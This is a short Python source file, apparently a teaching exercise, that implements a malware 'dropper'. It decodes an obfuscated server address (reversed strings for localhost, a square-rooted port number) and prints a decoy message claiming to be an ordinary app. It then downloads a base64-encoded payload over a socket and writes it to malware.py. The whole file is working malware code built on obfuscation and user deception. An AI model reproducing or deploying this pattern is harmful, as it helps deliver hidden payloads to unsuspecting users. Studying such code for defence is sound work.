#!/usr/bin/env python3

""" Implementation of dropper that downloads malicious code from the server
    and dumps it into a file.
"""

import base64
import logging
import socket
import math


class Dropper:
    """ This class represents the implementation of dropper.
    """

    def __init__(self, host1, host2, number):
        # Construct hostname of the remote server from the first two
        # arguments.
        self._host = self.decode_hostname(host1, host2)
        # Calculate the port number from the last argument.
        self._port = self.decode_port(number)
        # Initialize socket for the connection.
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def host(self):
        """ Server that sends us the malicious code. """
        return self._host

    @host.setter
    def host(self, new_host):
        self._host = new_host

    def decode_hostname(self, str1, str2):
        """ Returns hostname of the remote server. """
        return str2[::-1] + str1[::-1]

    @property
    def port(self):
        """ Port, on which the server runs (`int`). """
        return self._port

    @port.setter
    def port(self, new_port):
        self._port = new_port

    def decode_port(self, port):
        """Returns target port of the remote server. """
        return int(math.sqrt(port))

    @property
    def socket(self):
        """ Client socket. """
        return self._socket

    def dump_data(self, data):
        """ Write the retrieved data from the server into the file.
        """
        with open('malware.py', 'wb') as file:
            file.write(data)

    def download_malicious_code(self):
        """ Download malicious code from the server. """
        # Create a connection to the server.
        try:
            self.socket.connect((self.host, self.port))
        except socket.error:
            logging.debug('Dropper could not connect to the server.')
            return

        # Try to act as an ordinary application.
        print(
            'Hello, this is a totally ordinary app. '
            'I\'m surely not doing anything malicous'
        )

        # Receive the malicious code in the encrypted form.
        command = self.socket.recv(1000)
        # Decode the command and dump it into a file.
        decode_payload = base64.b64decode(command)
        self.dump_data(decode_payload)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Initialize dropper application.
    dropper = Dropper('tsoh', 'lacol', 729000000)
    # Collect the malicious code and dump it into the file.
    dropper.download_malicious_code()
